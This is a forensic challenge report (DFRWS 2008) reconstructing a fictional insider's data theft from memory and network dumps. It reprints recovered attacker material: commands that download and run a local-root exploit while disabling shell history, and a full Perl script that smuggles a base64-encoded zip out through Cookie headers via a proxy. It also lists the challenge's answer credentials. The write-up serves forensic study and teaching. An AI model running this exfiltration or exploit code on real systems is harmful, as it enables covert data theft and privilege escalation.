@@ -1,0 +1,232 @@
+DFRWS 2008 Challenge
+
+Report by Philipp Hellmich (phil@hellmi.de)
+
+The investigation was made using pyflag 0.87pre1 and some unix tools (strings, grep, awk, php)
+
+1) What relevant user activity can be reconstructed from the data and what does it show? 
+
+1.1) http requests in network dump and mozila history
+
+Based on the mozilla history and the pcap file you can find a lot of http requests. These requests can be divided into these categories:
+
+- fake requests using a proxy server 219.93.175.67:80 with hidden data (see question 4)
+- webmail messages and google docs (Steve Vogon corresponds with faatali@hotmail.com, who would like to buy some sensitive files containing passwords and so on)
+- looking for information regarding leaving the USA to a foreign country which do not have a extradition contract with the USA
+- looking for information regarding foreign bank account setups (for example mails to noblebank.pl)
+- flight booking (leavingDate 12/30/2007; returningDate	1/30/2008; 2 seats; From Dulles; To Costa Rica)
+
+Detailed information regarding http requests can be found in the pyflag_report folder (http001-036.html, mozHistory001-006.html, mozForms001.html)
+
+1.2) Some other evidence
+
+In folder user_files/.mc/history some recent open folders can be found:
+0=/home/stevev
+1=/mnt
+2=/mnt/hgfs
+3=/mnt/hgfs/Admin_share
+4=/media
+5=/media/disk
+6=/media/disk/DFRWS
+
+All other files in user_files beside the mozilla folder and .mc history do not seem to be relevant here.
+
+2) Is there evidence of inappropriate or suspicious activity on the system related to the user? 
+
+Yes, seceral suspicious actions can be found by checking the string contents of the memory dump. The user tries to get root rights by exploiting the system. Here are some examples which can be found using this commands:
+
+2.1) Searching for milw0rm.com exploits
+
+strings challenge.mem  | grep exploit | grep milw:
+...
+http://milw0rm.com/exploits/4028 (OpenBSD screen 4.0.3 exploit, not relevant due to running 2.6.18-8.1.15.el5)
+http://milw0rm.com/exploits/2492 (ELF Binaries Exploit, maybe relevant)
+http://milw0rm.com/exploits/2013 (<= 2.6.17.4 Local root expoit, not relevant too old)
+http://milw0rm.com/exploits/1831 (libtiff <= 3.8.2) local stack buffer overflow PoC, probably not used)
+http://milw0rm.com/exploits/1596 (X.ORG X11R6.9.0/X11R7.0 Local root exploit, used but system should not be vulnerable)
+...
+
+2.1) Evidence for using a local root exploit
+c11f4b8 wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
+...
+d9a8dd6 tar -zpxvf xmodulepath.tgz
+d9a8df1 cd xmodulepath
+d9a8e03 unset HISTORY
+d9a8e11 ./root.sh
+d9a8e1b exit
+
+2.3) Conclusion
+
+The suspect was looking for exploits to gain local rool access. At leat one time he tried to execute such exploit and tried to hide all evidence by running unset HISTORY. Due to the analyzed system war running kernel 2.6.18.... the system should not be vulnerable to all above expolots cause they are quite old.
+
+
+3) Is there evidence of collaboration with an outside party? If so, what can be determined about the identity of te outside party? How was any collaboration conducted? 
+
+Yes, Steve Vogon communicated several times with faatali@hotmail.com. A kind of contract can be found in google docs, this document describes which data faatali wants to buy from Steve. The contract was created by Steve and mailed to faatali at Sat, 8 Dec 2007 21:53:26 -0800. The final terms seems to be disscesed by phone.
+
+This is the content of the google docs document:
+
+Asset	Type	Content		Price
+
+domain.xls	Access Crd	DB_INVST/Admin, DB_INVST/dba, PVT_BNK/bbthornton, PVT_BNK/vip_supot		23
+intranet.vsd	Network Diag	Internal MX, NIDS System + Sensors, DB Farm					5
+acct_prem.xls	Premium Accts		u-name, pw & funds; approx 700 ct					25
+ftp.pcap	Packet Capture		Internal transaction DB FTP session, incl creds				4									
+														$57
+					OK -- ACCEPTABLE
+
+Further details can be found in the pyflag_report folder (webmail001.htm) and a pdf print of the contract can be found in the contact folder
+
+4) Is there evidence that sensitive data was copied? If so, what can be determined about that data and the manner of transfer?
+
+In order to find any relevant evidence I tried to look for the above files in the network dump / webmail messages / local files and so on. Eventually I have found the evidence of transfering a 21K zip file (containing the relevant files) using a perl script (which hides data in fake http requests using a remote proxy) in the memory image and in the network dump.
+
+4.1) Evidence for secret files insiede a zip file
+
+selected using strings of memory image (offset gap content)
+c11e930 cp /mnt/hgfs/Admin_share/*.xls .
+c45b658 cp /mnt/hgfs/Admin_share/*.pcap .
+c5ec128 cp /mnt/hgfs/Admin_share/intranet.vsd .
+c65a930 cp /mnt/hgfs/Admin_share/*.xls .
+b1e230 zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls /mnt/hgfs/Admin_share/domain.xls /mnt/hgfs/Admin_share/ftp.pcap
+cb1ec08 zipcloak archive.zip
+cb66211 m archive.zip
+d3bb666 archive.zip  Desktop  temp
+d3bb681 [stevev@goldfinger ~]$ rm archive.zip
+107f881e archive.zip
+
+4.2) Evidence for zip file size
+
+66d782f -rw-r--r-- 1 stevev stevev  21K Dec 16 22:28 archive.zip
+
+4.3) Evidence for special transfer script
+
+66d77d1 [stevev@goldfinger ~]$ cp /mnt/hgfs/software/xfer.pl .
+
+4.3) Evidence for file transfer
+# strings --radix=x challenge.mem | grep -A2 -B 3 "Data transmission complete"
+
+ 90bdb8 [stevev@goldfinger ~]$ ./xfer.pl archive.zip
+ 90bde7 Preparing archive.zip for transmission ......
+ 90be18 Sending now. Patience please ....
+ 90be49 Data transmission complete. Exiting.
+ 90be72 ]0;stevev@goldfinger:~
+ 90be89 [stevev@goldfinger ~]$
+
+4.4) Evidence for file transfer script content
+
+f611000 #!/usr/bin/perl
+f611012 use strict;
+f61101e use warnings;
+f61102c use MIME::Base64;
+f61103e use vars qw/@urls/;
+f611053 my $user_agent = "Mozilla/5.0 (X11; U; Linux i686; en-US) Gecko/20071126";
+f61109e #my $proxy_ip = "219.93.175.67:80";
+f6110c2 @urls = ( "http://youtube.com/", "http://www.google.com/search?hl=en&q=pig+latin", "http://www.idioma-software.com/pig/pig_latin.html", "http://www.yahoo.com/", "http://mail.yahoo.com/", "http://www.myspace.com/", "http://vids.myspace.com/index.cfm?fuseaction=vids.individual&VideoID=23886700", "http://youtube.com/", "http://youtube.com/watch?v=ZiRHyzjb5SI", "http://youtube.com/watch?v=1RUFBGDvsy0", "http://www.google.com/search?hl=en&q=juicy+fruit", "http://www.wrigley.com/wrigley/products/pop_juicy_fruit.asp", "http://www.amazon.com/Juicy-Fruit-Mtume/dp/B0000025UL", "http://www.facebook.com/", "http://www.live.com/", "http://search.live.com/results.aspx?q=hurricane", "http://www.ebay.com/", "http://books.ebay.com/", "http://photography.ebay.com/", "http://crafts.ebay.com/", "http://en.wikipedia.org/wiki/Main_Page", "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29", "http://en.wikipedia.org/wiki/Lee_Smith_\%28baseball_player\%29&action=edit", "http://www.msn.com/", "http://www.slate.com/id/2179838/?GT1=10733", "http://mail.live.com/", "http://costarica.en.craigslist.org/rfs/", "http://costarica.en.craigslist.org/apa/");
+f611544 my @send_data;
+f611553 my $inputfile;
+f611562 my $chunk_size = 1236;
+f61157b sub encoder {
+f61158a         open (F, "<", $inputfile) or die "Couldn't open $inputfile\n\n";
+f6115cc         #don't want to break into recognizable base64 line lengths, so set $eol empty
+f61161b         my $eol = "";
+f61162a         local $/ = undef;
+f61163d         my $tmp = encode_base64( <F>, $eol );
+f611664         close (F);
+f611672         return chunker( $tmp );
+f61168e sub chunker {
+f61169d         my $template = "A$chunk_size " x (length($_[0])/$chunk_size);
+f6116dc         $template .= "A*";
+f6116f0         #print "Template is: $template \n";
+f611715         my @temp = unpack("$template", $_[0]);
+f61173d         my $i = 0;
+f611749         foreach my $chunk (@temp) {
+f611766                 $i++;
+f61176e                 if ($i % 3 == 0) { $chunk = "RMID=" . $chunk; next;}
+f6117a5                 if ($i % 2 == 0) { $chunk = "Sessid=" . $chunk; next;}
+f6117de                 else {$chunk = "CVal=" . $chunk;}
+f611809         #print "Chunked array is : @temp \n";
+f611832         return @temp;
+f611845 sub fluff_urls {
+f611857 my $t = 0;
+f611862 until ( (scalar @urls) >= (scalar @send_data) ) {
+f611894         $urls[$#urls+1] = $urls[$t];
+f6118b2         $t++;
+f6118c1 sub ship_data {
+f6118d2         my $i = 0;
+f6118df         # $proxy_ip can specify a non-standard port, just edit the variable with ip:port syntax
+f611938         # however, this doesn't work with separate system() calls as is. better to set in parent
+f611992         # shell.
+f61199c #       system ('env http_proxy="http://$proxy_ip"');
+f6119cd         foreach my $data_chunk (@send_data) {
+f6119f6                 `wget -q --no-cookies --proxy=on --header=\"Cookie: $data_chunk\" --user-agent=\"$user_agent\" -O - $urls[$i]`;
+f611a68                 $i++;
+f611a70                 sleep 12;
+f611a7c                 sleep int(rand(40));
+f611a9b $inputfile = $ARGV[0];
+f611ab3 print "Preparing $inputfile for transmission ......\n\n";
+f611aee @send_data = encoder();
+f611b07 #now make sure we have enough URL requests to embed data chunks
+f611b47 fluff_urls();
+f611b56 print "Sending now. Patience please ....\n";
+f611b84 ship_data();
+f611b91 #       foreach my $data_chunk (@send_data) {
+f611bba #       print "Chunk is: $data_chunk \n\n";
+f611be1 #       }
+f611be8 print "Data transmission complete. Exiting.\n\n";
+f611c1d # $i = scalar @urls;
+f611c32 # print "URLS after number: $i";
+f611c56 # print @urls;
+f611c68 # Start sending the data out
+
+4.5)  Decoding packets
+php extract.php
+DFRWS 2008 xfer.pl Decoder
+
+- - - - - - - - - - - - - - - - - - - -
+Handle: Resource id #4
+Path: /pyflag/tools/net/data
+duplicate found: id 400
+duplicate found: id 428
+duplicate found: id 430
+duplicate found: id 582
+Found data in 24 packets
+Writting to result to undecoded_archive.zip
+Decodd 28472 chars to 21353 bytes
+Writting to result to decoded_archive.zip
+
+4.6) Conclusion
+The suspect transfered a zip file (containing acct_prems.xls, domain.xls and ftp.pcap) using a special perl script. The script splits a file into chunks of 1236 bytes. In order to transfer a binary file hidden in http requests, the binary data is converted using base64_encode. After this preperation the scrip calls wget to download some predefined urls using a proxy server (219.93.175.67:80). All chunks were added to the http request using the cookie header. The proxy server seems to be controlled by an outside party who is able to reconstruct the file by decoding the cookies. 
+
+This is an example:
+GET http://photography.ebay.com/ HTTP/1.0
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) Gecko/20071126
+Accept: */*
+Host: photography.ebay.com
+Cookie: CVal=tTql/WXX9ZyWWi/oncvow2FPTqEE4vwbVYT8dTDKLRtS9VBKTVhAVMiB/909PJTsYeD
+jdevTd7gsFo9KnirsyCVXDNdH/g2WtgH03D8vEeCKYtGyXsplJmhlhyfpYtfS0AHo1wFDG5Xob9p5Pk4
+0pZ+Bz0aN1CzFkM3DptBjzQhh9RsqRot+OBzXMyv1mC3px4zS6tRvqNc3XxWwyBhYK7tKqbmv5IsBP5L
+86akL0P5Ezuz9mlyye0cBW+76myTq556Rl3bGJIu1odFOxoy1GeCOhOBurQNkVWQS3DkpcWqbo5UURMW
+M3KPXvOYY9rE0NAjcfZP3FWoCZ0ggvFMDvWWU9lKwn2Vgt5ZgWtyi3+hEM4VIQwRp8Ds/C6Zt2p9uv6m
+VkioPSvRy3/G/hbKeJ8TOVlxC8dR0acXypprRYxmH7BBA/oUuYKW5PhC8c59Cdmo800D5ZffJbAV8dk8
+edlM22ec8+rF/qbvHRRRsS+IBc1f9ulFdXT3x19l9jE6y9yjNEuHlnjdb2Uk6TJTZwqqSsmYFyrIr/xx
+pGLQrpGxYMAdOwVRlOJjooK32s/Etg4vevFjAeWo1RSK3b3MDpuzAZpb1zIHAIWEvEmZ1RfPnv03Jqtq
+cjgADcTtH4mBCCBwQFRr+oUbwfk3S0e+PtcJRKFI8xcu2egqtGF75yeI9o6bisbtG47hkCDXmbP2A6tU
+AX6vVd7OiU1Pw66OIgk2HLNPPTClo73Gf0zruQ1CASgTU9/PUM0zqjks4mOhpPjP9z7scFhN9j+55nHq
+vQNRganc9hLx71rrLc+b/eRfNhtuL/JRwnwPqEb/xrjj0qNYk6Tgyw9UenFHclj+S2nkl6iqc9ECopl9
+z6gzL4UlRaC3yAMECV4jhIG2oZlz+MyhHknR5Qgxl/vx4Sm3GAXhpLWeNZO+53EGjfn+bsnllGjuhQKw
+FXASsZA97NpFac8YkhTRCDSmhOHiPUURiEddmiP0Y6p4xwKWc+gzvjaxPL39Nz5e/3BGcp1kbeHscEKl
+pFPi1EOzg5mtaIWp/oYPNQMqkfuYphhxBdadM+j4vRFn8Hig86ZeMtaXTiBDbwFxNNaGeN84NHBMY6wR
+5CBF/TI3p5JTnC5L11PoEru+2bh+kRcAUrNEnQ1h9WE0MjpbKdTCqTipsdIO7nvZPmRQ+vqY6zY+aiF7
+nAqX8A1FYc8FiCet039+wXrCMkAhmEWSQ6AcKZSbQMVyLfHCK
+
+In order to recreate the zip file I have built some kind of decoder. The results can be seen in 4.5. The decoder itself is in the pyflag_php_decoder directory. Basiclly the decoder tries to revert all steps of the xfer.pl script. Due to the chunks were created of a compressed file it is very unlikely to get two parts with the same content. So my decoder skips duplicates. You can fine some more comments in the extract.php script.
+
+The zip file is protected by a password ('rhubarb') which can be cracked using some brute force tools, this can be done in less than a minute.
+
+This are the extracted files:
+acct_prem.xls contains 292 entries (Username, PW, Balance)
+domain.xls contains 42 entries (DOMAIN, Username, Passowrd)
+ftp.pcap contains ftp login session (User fred, Pass krueger)
+
+Further details can be found in the sensitive_file_transfer folder.
